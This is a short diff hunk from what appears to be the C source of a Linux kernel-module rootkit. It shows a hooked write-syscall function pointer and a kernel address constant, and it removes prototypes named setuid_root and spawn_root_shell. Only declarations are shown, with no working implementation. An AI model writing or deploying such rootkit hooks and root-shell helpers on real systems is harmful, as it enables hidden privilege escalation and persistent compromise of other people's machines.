@@ -17,9 +17,6 @@ module_exit(rkit_exit);
 #define END_CHECK 0xffffffffa2000000
 typedef uint64_t psize;
 
-void setuid_root(void);
-void spawn_root_shell(void);
-
 
 /* function pointer for echo's and rkit_write's symbol */
 asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
